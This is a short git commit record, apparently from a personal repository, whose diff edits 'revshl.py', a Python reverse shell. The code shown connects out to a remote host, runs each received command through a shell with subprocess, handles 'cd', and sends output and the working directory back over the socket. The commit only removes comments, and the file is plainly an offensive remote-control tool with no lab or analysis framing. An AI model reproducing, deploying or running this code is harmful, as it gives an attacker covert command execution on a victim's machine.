7fccd82d27e4489f63e5c104548d67176ad0e0a2
Miguellpz9-Ipv8 <Miguellpz9@yahoo.com>
2023-11-25 14:07:25 -0800

    Update revshl.py

--- revshl.py
+++ revshl.py
@@ -11,11 +11,11 @@ s.connect((host, port))
 while True:
     data = s.recv(1024)
     if data[:2].decode("utf-8") == "cd":
-        os.chdir(data[3:].decode("utf-8").strip())  # Fixed the indexing and added strip() to remove leading/trailing spaces
+        os.chdir(data[3:].decode("utf-8").strip())
     if len(data) > 0:
-        process = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  # Fixed the subprocess.Popen call
+        process = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
         output, error = process.communicate()  # Separated stdout and stderr
-        readable_output = output.decode("utf-8") + error.decode("utf-8")  # Decoded output and error
+        readable_output = output.decode("utf-8") + error.decode("utf-8") 
         s.sendall(readable_output.encode("utf-8") + os.getcwd().encode("utf-8") + b">")  # Fixed the send call
 s.close()
 
